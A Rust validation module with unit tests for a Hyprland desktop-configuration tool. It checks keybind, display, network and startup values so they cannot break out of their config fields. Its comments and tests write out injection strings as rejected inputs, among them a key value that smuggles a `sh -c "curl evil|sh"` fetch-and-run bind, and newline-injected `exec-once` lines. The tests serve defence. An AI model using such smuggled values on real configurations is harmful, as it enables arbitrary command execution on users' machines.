//! Validation for values that end up verbatim inside a Hyprland config line.
//!
//! `tezca keybind` and `tezca display` both format caller-supplied strings
//! straight into `keybinds.lua` / the generated override store. Hyprland's config is
//! line-oriented and comma-separated, so an unchecked value has two ways to break
//! out of its field:
//!
//!   * a **comma** shifts every field after it — `--key 'X, exec, sh -c …'`
//!     lands as `bind = $mod, X, exec, sh -c …`, a working bind that runs an
//!     arbitrary command on keypress;
//!   * a **newline** injects an entire additional directive, because the rewritten
//!     line is later joined back together with `\n`.
//!
//! The `--expect` guard cannot catch either: it checks the value being *replaced*,
//! not the replacement. So every field is checked here before it is formatted in.
//!
//! The allowlists are derived from what Hyprland actually accepts and from the
//! shipped `keybinds.lua` / `monitors.lua`, so nothing already in the repo is
//! rejected: keysyms are `[A-Za-z0-9_:]` (`Control_R`, `mouse:272`,
//! `XF86AudioMute`, `comma`, `SPACE`), modifiers are `$mod`/`SUPER`/`ALT`/`CTRL`/
//! `SHIFT`, and monitor fields are the `WxH@R` / `0x0` / `auto` / `preferred`
//! shapes in `monitors.conf`.

/// A modifier list: whitespace-separated names, or empty for an unmodified bind.
pub fn keybind_mods(v: &str) -> Result<(), String> {
    for tok in v.split_whitespace() {
        // `$mod` is the file's house style for SUPER and must stay writable.
        if tok == "$mod" {
            continue;
        }
        if !tok.chars().all(|c| c.is_ascii_alphabetic()) {
            return Err(format!(
                "invalid modifier {tok:?} — expected names like SUPER, SHIFT, ALT, CTRL (or $mod)"
            ));
        }
    }
    Ok(())
}

/// A single keysym. One token, `[A-Za-z0-9_:]` only.
pub fn keybind_key(v: &str) -> Result<(), String> {
    let k = v.trim();
    if k.is_empty() {
        return Err("key cannot be empty".to_string());
    }
    if let Some(bad) = k.chars().find(|c| !(c.is_ascii_alphanumeric() || *c == '_' || *c == ':')) {
        return Err(format!(
            "invalid character {bad:?} in key {k:?} — keysyms are letters, digits, \
             '_' and ':' (e.g. W, F12, comma, Control_R, mouse:272)"
        ));
    }
    Ok(())
}

/// A bind's `# comment` label. Free text, but it has to stay on one line.
pub fn keybind_desc(v: &str) -> Result<(), String> {
    reject_control("description", v)
}

/// A dispatcher plus its arguments (`exec, uwsm app -- firefox`).
///
/// Deliberately permissive: commas separate the dispatcher from its arguments, so
/// they are legitimate here, and the argument is an arbitrary command by design —
/// this is the one field whose whole purpose is to say what to run. Only the
/// line-injection characters are refused.
pub fn keybind_action(v: &str) -> Result<(), String> {
    if v.trim().is_empty() {
        return Err("action cannot be empty".to_string());
    }
    reject_control("action", v)
}

// --- hypr keywords ---------------------------------------------------------

/// A Hyprland option path: `decoration:rounding`, `decoration:blur:size`.
pub fn hypr_option(v: &str) -> Result<(), String> {
    let k = v.trim();
    if k.is_empty() {
        return Err("option name cannot be empty".to_string());
    }
    // `.` is legal inside a category — Hyprland spells the border gradients
    // `general:col.active_border`. Both separators end up descending a level
    // when the option is turned into an `hl.config` table, so both are allowed
    // here, but nothing else is: every segment is emitted as a bare Lua
    // identifier into generated code.
    if let Some(bad) =
        k.chars().find(|c| !(c.is_ascii_alphanumeric() || *c == '_' || *c == ':' || *c == '.'))
    {
        return Err(format!(
            "invalid character {bad:?} in option {k:?} — expected a path like decoration:rounding"
        ));
    }
    if k.split([':', '.'])
        .any(|seg| seg.is_empty() || seg.chars().next().is_some_and(|c| c.is_ascii_digit()))
    {
        return Err(format!(
            "malformed option path {k:?} — every segment must be a non-empty name, e.g. decoration:blur:size"
        ));
    }
    Ok(())
}

/// A Hyprland option value.
///
/// Values are genuinely varied — `12`, `0.7`, a `5 5 5 5` gaps tuple, an
/// `rgba(...)` colour — so this is a denylist rather than an allowlist. It refuses
/// the two characters that change the *shape* of the config: a newline (which
/// would append an extra directive that `tezca hypr reset` then cannot remove,
/// because the managed block keys an entry by its first line only) and a `#`
/// (which would comment out the rest of the line and silently truncate the value).
pub fn hypr_value(v: &str) -> Result<(), String> {
    if v.trim().is_empty() {
        return Err("value cannot be empty".to_string());
    }
    reject_control("value", v)?;
    if v.contains('#') {
        return Err(format!(
            "invalid '#' in value {v:?} — it would comment out the rest of the line"
        ));
    }
    Ok(())
}

// --- display ---------------------------------------------------------------

/// A monitor mode: `preferred` / `highres` / `highrr` / `maxwidth` / `disable`,
/// or `<w>x<h>` with an optional `@<rate>`.
pub fn display_mode(v: &str) -> Result<(), String> {
    let m = v.trim();
    if matches!(m, "preferred" | "highres" | "highrr" | "maxwidth" | "disable") {
        return Ok(());
    }
    let (res, rate) = match m.split_once('@') {
        Some((r, hz)) => (r, Some(hz)),
        None => (m, None),
    };
    let Some((w, h)) = res.split_once('x') else {
        return Err(format!(
            "invalid mode {m:?} — expected WIDTHxHEIGHT[@RATE] (e.g. 3440x1440@165) or 'preferred'"
        ));
    };
    for (label, n) in [("width", w), ("height", h)] {
        if n.is_empty() || !n.chars().all(|c| c.is_ascii_digit()) {
            return Err(format!("invalid {label} {n:?} in mode {m:?} — expected a whole number"));
        }
    }
    if let Some(hz) = rate {
        decimal("refresh rate", hz)?;
    }
    Ok(())
}

/// A scale factor: a positive decimal, or `auto`.
pub fn display_scale(v: &str) -> Result<(), String> {
    let s = v.trim();
    if s == "auto" {
        return Ok(());
    }
    let n = decimal("scale", s)?;
    if n <= 0.0 {
        return Err(format!("invalid scale {s:?} — must be greater than zero"));
    }
    Ok(())
}

/// A position: `<x>x<y>` (either may be negative), or an `auto…` placement.
pub fn display_pos(v: &str) -> Result<(), String> {
    let p = v.trim();
    // `auto`, `auto-right`, `auto-left`, `auto-up`, `auto-down`, …
    if p == "auto"
        || p.strip_prefix("auto-").is_some_and(|r| {
            !r.is_empty() && r.chars().all(|c| c.is_ascii_alphabetic() || c == '-')
        })
    {
        return Ok(());
    }
    // Split on the separator, not on a leading minus sign: `-1920x0` is valid.
    let body = p.strip_prefix('-').map(|r| ("-", r)).unwrap_or(("", p));
    let Some((x, y)) = body.1.split_once('x') else {
        return Err(format!("invalid position {p:?} — expected XxY (e.g. 0x0, 3440x0, -1920x0)"));
    };
    for (label, n) in [("x", x), ("y", y)] {
        let digits = n.strip_prefix('-').unwrap_or(n);
        if digits.is_empty() || !digits.chars().all(|c| c.is_ascii_digit()) {
            return Err(format!(
                "invalid {label} coordinate {n:?} in position {p:?} — expected a whole number"
            ));
        }
    }
    Ok(())
}

/// A transform: an integer 0–7 (the eight rotate/flip states).
pub fn display_transform(v: &str) -> Result<(), String> {
    let t = v.trim();
    match t.parse::<u8>() {
        Ok(n) if n <= 7 => Ok(()),
        _ => Err(format!("invalid transform {t:?} — expected 0-7")),
    }
}

/// A VRR mode: empty (inherit the global setting), or 0/1/2.
///
/// Hyprland has historically grown modes here (0 off, 1 on, 2 fullscreen-only),
/// so this accepts the three we drive and rejects the rest rather than passing an
/// unknown number through to a monitor spec.
pub fn display_vrr(v: &str) -> Result<(), String> {
    match v.trim() {
        "" | "0" | "1" | "2" => Ok(()),
        other => {
            Err(format!("invalid vrr {other:?} — expected 0 (off), 1 (on) or 2 (fullscreen-only)"))
        }
    }
}

/// A colour depth: empty (inherit), 8 or 10.
pub fn display_bitdepth(v: &str) -> Result<(), String> {
    match v.trim() {
        "" | "8" | "10" => Ok(()),
        other => Err(format!("invalid bitdepth {other:?} — expected 8 or 10")),
    }
}

/// A saved-profile name. It becomes a `["…"]` key in generated Lua, so it is held
/// to the same shape as any other generated identifier.
pub fn profile_name(v: &str) -> Result<(), String> {
    let n = v.trim();
    if n.is_empty() {
        return Err("profile name cannot be empty".to_string());
    }
    if n.len() > 64 {
        return Err("profile name is too long (64 characters max)".to_string());
    }
    if let Some(bad) =
        n.chars().find(|c| !(c.is_ascii_alphanumeric() || *c == '-' || *c == '_' || *c == ' '))
    {
        return Err(format!(
            "invalid character {bad:?} in profile name {n:?} — letters, digits, spaces, '-' and '_'"
        ));
    }
    Ok(())
}

/// A monitor selector as accepted on the command line: a connector name
/// (`DP-1`, `HDMI-A-1`, `eDP-1`) or a `desc:` form (`desc:LG Electronics LG
/// ULTRAGEAR 304MXTC6X433`).
///
/// The `desc:` form is what "remember by description" persists, so settings
/// follow a monitor across ports instead of being stranded when it moves. Its
/// payload is a vendor string, not a connector, so the character rule below is
/// deliberately looser — but not unbounded, see [`monitor_desc`].
pub fn monitor_name(v: &str) -> Result<(), String> {
    let n = v.trim();
    if n.is_empty() {
        return Err("monitor name cannot be empty".to_string());
    }
    if let Some(desc) = n.strip_prefix("desc:") {
        return monitor_desc(desc);
    }
    if let Some(bad) = n.chars().find(|c| !(c.is_ascii_alphanumeric() || *c == '-' || *c == '_')) {
        return Err(format!(
            "invalid character {bad:?} in monitor name {n:?} — connectors are letters, \
             digits, '-' and '_' (e.g. DP-1, HDMI-A-1), or use desc:<description>"
        ));
    }
    Ok(())
}

/// The payload of a `desc:` monitor selector.
///
/// Descriptions are free-form vendor strings with spaces in them, so most of
/// `monitor_name`'s rule does not apply. Four characters are still refused:
///
///   * `"` and `\` would break out of the generated `output = "…"` literal;
///   * a newline would inject a second line into the table;
///   * a comma would split the entry, because `managed::parse_monitor_entry`
///     reads a rendered monitor by splitting its fields on `,`. Nothing stops a
///     vendor shipping a description with a comma in it, so this is refused up
///     front with a real message rather than silently mangled on the next read.
pub fn monitor_desc(v: &str) -> Result<(), String> {
    let d = v.trim();
    if d.is_empty() {
        return Err("desc: needs a description after it".to_string());
    }
    if let Some(bad) = d.chars().find(|c| ",\"\\\n\r".contains(*c)) {
        return Err(format!(
            "invalid character {bad:?} in monitor description {d:?} — a description \
             cannot contain a comma, quote, backslash or newline; use the connector \
             name for this monitor instead"
        ));
    }
    if d.chars().any(|c| c.is_control()) {
        return Err(format!("control character in monitor description {d:?}"));
    }
    Ok(())
}

/// A workspace id as accepted for a rebinding: a positive integer, or one of
/// Hyprland's named forms (`special:magic`, `name:foo`).
pub fn workspace_id(v: &str) -> Result<(), String> {
    let w = v.trim();
    if w.is_empty() {
        return Err("workspace id cannot be empty".to_string());
    }
    if w.chars().all(|c| c.is_ascii_digit()) {
        return if w.trim_start_matches('0').is_empty() {
            Err("workspace ids start at 1".to_string())
        } else {
            Ok(())
        };
    }
    if let Some(rest) = w.strip_prefix("special:").or_else(|| w.strip_prefix("name:")) {
        if rest.is_empty() {
            return Err(format!("{w:?} needs a name after the prefix"));
        }
        if let Some(bad) = rest.chars().find(|c| !(c.is_ascii_alphanumeric() || "-_".contains(*c)))
        {
            return Err(format!("invalid character {bad:?} in workspace name {rest:?}"));
        }
        return Ok(());
    }
    Err(format!(
        "invalid workspace id {w:?} — use a number (1, 2, …), special:<name> or name:<name>"
    ))
}

// --- network ---------------------------------------------------------------

/// A Wi-Fi network name.
///
/// 802.11 allows almost any byte here, so this is not about what a network *can*
/// be called — nmcli takes the name as an argv element, with no shell in
/// between. It is about what we can round-trip: a control character would break
/// the `--machine` records the GUI parses back, and an over-long name is not a
/// real SSID at all (the field is 32 bytes).
pub fn ssid(v: &str) -> Result<(), String> {
    if v.is_empty() {
        return Err("network name cannot be empty".to_string());
    }
    if v.len() > 32 {
        return Err(format!("network name is too long ({} bytes; the maximum is 32)", v.len()));
    }
    reject_control("network name", v)
}

/// A Bluetooth address, `AA:BB:CC:DD:EE:FF`.
pub fn mac(v: &str) -> Result<(), String> {
    let m = v.trim();
    let parts: Vec<&str> = m.split(':').collect();
    let ok = parts.len() == 6
        && parts.iter().all(|p| p.len() == 2 && p.chars().all(|c| c.is_ascii_hexdigit()));
    if ok {
        Ok(())
    } else {
        Err(format!("invalid Bluetooth address {m:?} — expected AA:BB:CC:DD:EE:FF"))
    }
}

// --- startup ---------------------------------------------------------------

/// A command line that will be emitted into a generated Lua string and run
/// through `sh -c` at login.
///
/// The quoting is handled at render time (`\` and `"` are escaped), so this only
/// has to refuse what escaping cannot save: a newline or control character, which
/// would end the generated line early and leave the rest of the table as
/// syntactically broken Lua. That file is read by the Hyprland config, and a Lua
/// error there is an emergency-mode session — so it is checked at the point of
/// entry rather than trusted.
pub fn exec_line(v: &str) -> Result<(), String> {
    if v.trim().is_empty() {
        return Err("command cannot be empty".to_string());
    }
    if v.len() > 4096 {
        return Err("command is too long (4096 characters max)".to_string());
    }
    reject_control("command", v)
}

/// A startup entry id — it addresses an entry for enable/disable/remove and is
/// emitted as a generated Lua string.
pub fn startup_id(v: &str) -> Result<(), String> {
    let id = v.trim();
    if id.is_empty() {
        return Err("id cannot be empty".to_string());
    }
    if id.len() > 64 {
        return Err("id is too long (64 characters max)".to_string());
    }
    if let Some(bad) = id.chars().find(|c| !(c.is_ascii_alphanumeric() || *c == '-' || *c == '_')) {
        return Err(format!(
            "invalid character {bad:?} in id {id:?} — letters, digits, '-' and '_' only"
        ));
    }
    Ok(())
}

// --- shared ----------------------------------------------------------------

/// Refuse anything that would end the config line early or smuggle a new one.
fn reject_control(field: &str, v: &str) -> Result<(), String> {
    if let Some(bad) = v.chars().find(|c| c.is_control()) {
        return Err(format!(
            "invalid control character {bad:?} in {field} — the value has to stay on one line"
        ));
    }
    Ok(())
}

/// Parse a plain decimal without pulling in a float-format edge case: reject the
/// exotic spellings `f64::from_str` accepts (`inf`, `NaN`, `1e9`, `+1`) so what
/// lands in the config file is what the user typed.
fn decimal(field: &str, v: &str) -> Result<f64, String> {
    let s = v.trim();
    let body = s.strip_prefix('-').unwrap_or(s);
    let ok = !body.is_empty()
        && body.chars().all(|c| c.is_ascii_digit() || c == '.')
        && body.chars().filter(|c| *c == '.').count() <= 1
        && body.chars().any(|c| c.is_ascii_digit());
    if !ok {
        return Err(format!("invalid {field} {s:?} — expected a number like 1, 1.5 or 165"));
    }
    s.parse::<f64>().map_err(|_| format!("invalid {field} {s:?}"))
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn accepts_every_modifier_combination_already_in_keybinds_conf() {
        for m in [
            "",
            "$mod",
            "$mod ALT",
            "$mod ALT CTRL",
            "$mod ALT SHIFT",
            "$mod CTRL",
            "$mod CTRL SHIFT",
            "$mod SHIFT",
            "$mod SHIFT ALT",
            "ALT",
            "ALT CTRL",
            "CTRL",
            "CTRL SHIFT",
            "SHIFT",
            "SUPER SHIFT",
        ] {
            assert!(keybind_mods(m).is_ok(), "{m:?} should be a valid modifier list");
        }
    }

    #[test]
    fn accepts_every_keysym_already_in_keybinds_conf() {
        for k in [
            "A",
            "W",
            "0",
            "9",
            "F12",
            "comma",
            "period",
            "slash",
            "SPACE",
            "Tab",
            "Return",
            "Escape",
            "Delete",
            "Print",
            "left",
            "right",
            "up",
            "down",
            "Control_R",
            "mouse:272",
            "mouse_up",
            "mouse_down",
            "XF86AudioRaiseVolume",
            "XF86MonBrightnessUp",
        ] {
            assert!(keybind_key(k).is_ok(), "{k:?} should be a valid keysym");
        }
    }

    #[test]
    fn rejects_a_comma_in_a_key_that_would_inject_a_dispatcher() {
        // The whole point: this would have landed as
        //   bind = $mod, X, exec, sh -c "curl … | sh", <original action>
        let e = keybind_key(r#"X, exec, sh -c "curl evil|sh""#).unwrap_err();
        assert!(e.contains("invalid character"), "{e}");
    }

    #[test]
    fn rejects_a_newline_in_a_key_that_would_inject_a_whole_bind_line() {
        assert!(keybind_key("X\nbind = , F1, exec, evil").is_err());
        assert!(keybind_mods("SUPER\nbind = , F1, exec, evil").is_err());
    }

    #[test]
    fn rejects_line_breaking_characters_in_a_description_and_an_action() {
        assert!(keybind_desc("Browser\nbind = , F1, exec, evil").is_err());
        assert!(keybind_action("exec, foo\nbind = , F1, exec, evil").is_err());
        // But an action's own commas are legitimate — that is its argument list.
        assert!(keybind_action("exec, uwsm app -- brave --new-window").is_ok());
        assert!(keybind_desc("Browser (default)").is_ok());
        assert!(keybind_action("").is_err());
    }

    #[test]
    fn accepts_the_monitor_shapes_used_in_monitors_conf() {
        assert!(display_mode("3440x1440@165").is_ok());
        assert!(display_mode("2560x1440@165").is_ok());
        assert!(display_mode("1920x1080@59.951").is_ok());
        assert!(display_mode("1920x1080").is_ok());
        assert!(display_mode("preferred").is_ok());
        assert!(display_pos("0x0").is_ok());
        assert!(display_pos("3440x0").is_ok());
        assert!(display_pos("-1920x0").is_ok());
        assert!(display_pos("auto").is_ok());
        assert!(display_pos("auto-right").is_ok());
        assert!(display_scale("1").is_ok());
        assert!(display_scale("1.5").is_ok());
        assert!(display_scale("auto").is_ok());
        assert!(display_transform("0").is_ok());
        assert!(display_transform("7").is_ok());
    }

    #[test]
    fn rejects_display_values_that_would_corrupt_the_managed_block() {
        // A newline here previously became an extra Hyprland directive that
        // `tezca display reset` could not remove, because the block is keyed on
        // the first line of an entry only.
        assert!(display_pos("0x0\nexec-once = evil").is_err());
        assert!(display_mode("3440x1440@165\nbind = , F1, exec, evil").is_err());
        assert!(display_scale("1\nmisc:vrr = 0").is_err());
        assert!(display_transform("9").is_err());
        assert!(display_transform("-1").is_err());
        assert!(monitor_name("DP-1, 1x1, 0x0, 1").is_err());
    }

    #[test]
    fn rejects_typos_that_would_break_the_config_on_next_reload() {
        // These are the accidental cases, not the adversarial ones: previously
        // they were written straight through and only failed at relogin.
        assert!(display_scale("abc").is_err());
        assert!(display_scale("0").is_err(), "a zero scale is not usable");
        assert!(display_scale("-1").is_err());
        assert!(display_mode("3440*1440").is_err());
        assert!(display_mode("3440x1440@abc").is_err());
        assert!(display_pos("0,0").is_err());
        // f64 accepts these; a monitor spec must not.
        assert!(display_scale("inf").is_err());
        assert!(display_scale("NaN").is_err());
        assert!(display_scale("1e3").is_err());
    }

    #[test]
    fn accepts_the_advanced_display_values_and_rejects_the_rest() {
        for v in ["", "0", "1", "2"] {
            assert!(display_vrr(v).is_ok(), "{v:?} should be a valid vrr mode");
        }
        assert!(display_vrr("3").is_err());
        assert!(display_vrr("on").is_err(), "the CLI maps names to numbers before validating");
        for v in ["", "8", "10"] {
            assert!(display_bitdepth(v).is_ok());
        }
        assert!(display_bitdepth("12").is_err());
        assert!(display_bitdepth("10\nexec-once = evil").is_err());
    }

    #[test]
    fn profile_names_stay_safe_as_generated_lua_keys() {
        assert!(profile_name("dual 165").is_ok());
        assert!(profile_name("solo-ultrawide").is_ok());
        assert!(profile_name("").is_err());
        // Would close the key and open a new table entry.
        assert!(profile_name("x\"] = {}, [\"y").is_err());
        assert!(profile_name("x\nreturn {}").is_err());
    }

    #[test]
    fn network_names_round_trip_but_cannot_break_a_machine_record() {
        assert!(ssid("Hivezga 5G").is_ok());
        assert!(ssid("café:net").is_ok(), "a colon is legal in an SSID");
        assert!(ssid("").is_err());
        // Would inject a second record into `net list --machine`.
        assert!(ssid("Net\n@ap\nssid=evil").is_err());
        assert!(ssid(&"x".repeat(33)).is_err());
        assert!(ssid(&"x".repeat(32)).is_ok());
    }

    #[test]
    fn bluetooth_addresses_are_six_hex_octets() {
        assert!(mac("AA:BB:CC:DD:EE:FF").is_ok());
        assert!(mac("08:71:90:80:d9:cc").is_ok());
        assert!(mac("08-71-90-80-D9-CC").is_err());
        assert!(mac("08:71:90:80:D9").is_err());
        assert!(mac("ZZ:71:90:80:D9:CC").is_err());
        assert!(mac("").is_err());
    }

    #[test]
    fn startup_commands_may_quote_but_never_break_the_generated_lua() {
        assert!(exec_line("uwsm app -- discord.desktop").is_ok());
        // Quotes and backslashes are legitimate: they are escaped on render.
        assert!(exec_line(r#"sh -c 'brave --flag="a,b"'"#).is_ok());
        assert!(exec_line("").is_err());
        // Would terminate the generated line and leave the table unparseable.
        assert!(exec_line("foo\nreturn {}").is_err());
        assert!(exec_line(&"x".repeat(5000)).is_err());
    }

    #[test]
    fn startup_ids_stay_addressable() {
        assert!(startup_id("discord").is_ok());
        assert!(startup_id("org-telegram_desktop").is_ok());
        assert!(startup_id("").is_err());
        assert!(startup_id("has space").is_err());
        assert!(startup_id("x\"] = nil, [\"y").is_err());
    }

    #[test]
    fn accepts_real_connector_names() {
        for n in ["DP-1", "DP-3", "HDMI-A-1", "eDP-1", "DVI-D-1"] {
            assert!(monitor_name(n).is_ok(), "{n:?} should be a valid connector");
        }
    }

    #[test]
    fn accepts_the_descriptions_this_machine_actually_reports() {
        // Straight out of `hyprctl monitors -j` on the dev box.
        for d in [
            "desc:Xiaomi Corporation Mi monitor 5505810021466",
            "desc:ASUSTek COMPUTER INC ASUS VG32V 0x0001FBAA",
            "desc:LG Electronics LG ULTRAGEAR 304MXTC6X433",
        ] {
            assert!(monitor_name(d).is_ok(), "{d:?} should be a valid desc selector");
        }
    }

    #[test]
    fn rejects_a_description_that_would_survive_writing_but_not_reading_back() {
        // A comma renders into valid Lua, so this cannot be caught at write time
        // — it corrupts on the next parse, when the entry is split on ','.
        assert!(monitor_name("desc:Acme Corp, Ltd. Monitor").is_err());
        assert!(monitor_name("desc:Acme \"X\"").is_err());
        assert!(monitor_name("desc:").is_err());
        // …and the connector rule still rejects what it always did.
        assert!(monitor_name("DP-1, 1x1, 0x0, 1").is_err());
    }

    #[test]
    fn workspace_ids_cover_the_numeric_and_named_forms() {
        for w in ["1", "10", "special:magic", "name:mail"] {
            assert!(workspace_id(w).is_ok(), "{w:?} should be a valid workspace id");
        }
        for w in ["", "0", "00", "-1", "1.5", "special:", "1, monitor:DP-1", "name:a b"] {
            assert!(workspace_id(w).is_err(), "{w:?} should be rejected");
        }
    }
}
